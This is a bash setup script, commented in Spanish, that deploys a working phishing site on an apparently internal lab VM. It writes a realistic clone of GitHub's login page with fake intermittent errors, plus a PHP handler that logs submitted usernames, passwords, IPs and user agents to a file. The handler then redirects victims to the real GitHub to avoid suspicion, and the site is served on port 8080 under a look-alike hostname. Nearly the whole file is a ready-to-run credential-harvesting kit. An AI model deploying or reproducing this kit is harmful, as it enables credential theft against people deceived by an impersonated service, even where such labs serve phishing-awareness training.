#!/usr/bin/env bash
# VM: internal-server  |  Phishing — página falsa de GitHub
# Credenciales capturadas en: /var/log/phishing.log
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

# Hay que asegurarse de que php-mysql está disponible
apt-get install -y -qq php libapache2-mod-php

# Página de phishing — clon visual de GitHub login
mkdir -p /var/www/phishing

cat > /var/www/phishing/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to GitHub</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      font-size: 14px;
      background: #f6f8fa;
      color: #24292f;
      line-height: 1.5;
    }
    header {
      background: #24292f;
      padding: 16px;
      text-align: center;
    }
    header svg { fill: white; width: 32px; height: 32px; }
    .container {
      max-width: 340px;
      margin: 40px auto;
      padding: 0 16px;
    }
    h1 {
      font-size: 24px;
      font-weight: 300;
      text-align: center;
      margin-bottom: 8px;
      color: #24292f;
    }
    h2 {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 16px;
      color: #24292f;
    }
    .box {
      background: white;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      padding: 24px;
      box-shadow: 0 1px 3px rgba(27,31,35,0.1);
    }
    .form-group { margin-bottom: 16px; }
    label {
      display: block;
      font-weight: 600;
      margin-bottom: 6px;
      color: #24292f;
    }
    input[type=text], input[type=password], input[type=email] {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      font-size: 14px;
      background: #f6f8fa;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    }
    input[type=text]:focus, input[type=password]:focus, input[type=email]:focus {
      border-color: #0969da;
      background: white;
      box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
      outline: none;
    }
    .forgot {
      font-size: 12px;
      float: right;
      color: #0969da;
      text-decoration: none;
      font-weight: 400;
    }
    .forgot:hover { text-decoration: underline; }
    .btn {
      width: 100%;
      padding: 12px 0;
      background: #2da44e;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
      margin: 8px 0;
    }
    .btn:hover { background: #2c974b; }
    .btn:disabled {
      background: #f6f8fa;
      color: #656d76;
      cursor: not-allowed;
    }
    .divider {
      position: relative;
      height: 1px;
      margin: 24px 0;
      background: #f6f8fa;
    }
    .divider::before {
      content: "or";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 0 16px;
      color: #656d76;
      font-size: 12px;
    }
    .auth-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 12px;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      background: white;
      color: #24292f;
      text-decoration: none;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
      transition: all 0.2s;
    }
    .auth-btn:hover {
      background: #f6f8fa;
      border-color: #0969da;
      text-decoration: none;
      color: #0969da;
    }
    .auth-icon {
      width: 20px;
      height: 20px;
      margin-right: 12px;
      flex-shrink: 0;
    }
    .signup-box {
      background: white;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      padding: 20px;
      text-align: center;
      margin-top: 16px;
      box-shadow: 0 1px 3px rgba(27,31,35,0.1);
    }
    .signup-box p {
      margin: 0 0 12px 0;
      color: #656d76;
    }
    .signup-box a { 
      color: #0969da; 
      text-decoration: none; 
      font-weight: 600;
    }
    .signup-box a:hover { text-decoration: underline; }
    .terms {
      font-size: 12px;
      color: #656d76;
      text-align: center;
      margin-top: 24px;
      line-height: 1.5;
    }
    .terms a { 
      color: #0969da; 
      text-decoration: none; 
      font-weight: 500;
    }
    .terms a:hover { text-decoration: underline; }
    .error {
      background: #dafbe1;
      border: 1px solid #2ea043;
      color: #1a7f37;
      padding: 12px;
      border-radius: 6px;
      margin-bottom: 16px;
      font-size: 13px;
    }
    @media (max-width: 480px) {
      .container { margin: 20px auto; padding: 0 20px; }
      .box { padding: 20px 16px; }
    }
  </style>
</head>
<body>
  <header>
    <!-- GitHub logo SVG -->
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
      <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
    </svg>
  </header>

  <div class="container">
    <h1>Sign in to GitHub</h1>
    
    <div class="box">
      <!-- Mensaje de error simulado -->
      <div class="error" id="errorMsg" style="display: none;">
        Incorrect username or password.
      </div>
      
      <form action="capture.php" method="POST" id="loginForm">
        <div class="form-group">
          <label for="username">Username or email address</label>
          <input type="text" id="username" name="username"
                 autocomplete="username" autofocus required>
        </div>
        <div class="form-group">
          <label for="password">
            Password
            <a href="#" class="forgot">Forgot password?</a>
          </label>
          <input type="password" id="password" name="password"
                 autocomplete="current-password" required>
        </div>
        <button type="submit" class="btn">Sign in</button>
      </form>
      
      <div class="divider"></div>
      
      <!-- Botones de autenticación externa -->
      <a href="#" class="auth-btn" id="googleBtn">
        <svg class="auth-icon" viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        Sign in with Google
      </a>
      
      <a href="#" class="auth-btn" id="githubEnterpriseBtn">
        <svg class="auth-icon" viewBox="0 0 16 16">
          <path fill="#000" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
        </svg>
        Sign in with GitHub Enterprise
      </a>
      
      <div style="text-align:center; font-size:13px; color:#656d76; margin-top:16px;">
        New to GitHub? <a href="#" style="color:#0969da;">Create an account</a>.
      </div>
    </div>
    
    <div class="signup-box">
      <p>Use an authenticator app or hardware key for extra security.</p>
      <a href="#" style="display:block; margin-bottom:8px;">Sign in with a passkey</a>
      <a href="#">Sign in with SAML</a>
    </div>
    
    <p class="terms">
      By signing in, you agree to our
      <a href="#">Terms of Service</a> and
      <a href="#">Privacy Policy</a>.
    </p>
  </div>

  <script>
    // Simular error ocasional para mayor realismo
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      // Simular fallo ~20% del tiempo
      if (Math.random() < 0.2) {
        e.preventDefault();
        const errorMsg = document.getElementById('errorMsg');
        errorMsg.style.display = 'block';
        errorMsg.scrollIntoView({ behavior: 'smooth' });
        setTimeout(() => {
          errorMsg.style.display = 'none';
        }, 5000);
      }
    });

    // Prevenir acciones reales en botones OAuth
    document.querySelectorAll('.auth-btn, .forgot, .signup-box a, .terms a').forEach(link => {
      link.addEventListener('click', function(e) {
        e.preventDefault();
      });
    });

    // Auto-focus en username
    document.getElementById('username').focus();
  </script>
</body>
</html>
EOF

# Script PHP que captura y loguea las credenciales
cat > /var/www/phishing/capture.php << 'EOF'
<?php
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip       = $_SERVER['REMOTE_ADDR'];
$date     = date('Y-m-d H:i:s');
$ua       = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';

// Guardar en log
$log_entry = "[$date] IP=$ip | user=$username | pass=$password | ua=$ua\n";
file_put_contents('/var/log/phishing.log', $log_entry, FILE_APPEND | LOCK_EX);

// Redirigir a GitHub real para no levantar sospechas
header('Location: https://github.com/login?error=incorrect_credentials');
exit;
?>
EOF

# Configurar VirtualHost Apache para el sitio de phishing
cat > /etc/apache2/sites-available/phishing.conf << 'EOF'
<VirtualHost *:8080>
    ServerName github.empresa.local
    DocumentRoot /var/www/phishing

    <Directory /var/www/phishing>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/phishing_error.log
    CustomLog ${APACHE_LOG_DIR}/phishing_access.log combined
</VirtualHost>
EOF

# Escuchar en puerto 8080 además del 80
if ! grep -q 'Listen 8080' /etc/apache2/ports.conf; then
    echo 'Listen 8080' >> /etc/apache2/ports.conf
fi

a2ensite phishing
systemctl restart apache2


# Crear fichero de log con permisos para Apache
touch /var/log/phishing.log
chmod 666 /var/log/phishing.log

echo "[internal-server] Phishing page desplegada en http://192.168.58.10:8080"
echo "[internal-server] Credenciales capturadas en: /var/log/phishing.log"